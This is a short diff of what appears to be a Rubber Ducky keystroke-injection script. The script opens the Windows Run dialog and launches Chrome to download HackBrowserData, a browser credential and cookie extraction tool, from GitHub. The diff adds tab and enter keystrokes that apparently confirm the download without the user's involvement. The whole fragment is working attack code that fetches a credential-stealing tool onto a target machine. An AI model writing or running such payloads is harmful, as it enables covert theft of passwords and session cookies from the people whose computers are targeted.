@@ -3,3 +3,7 @@ WINDOWS r
 DELAY 400
 STRING chrome.exe https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.5/hack-browser-data-windows-64bit.zip
 ENTER
+TAB
+TAB
+TAB
+ENTER
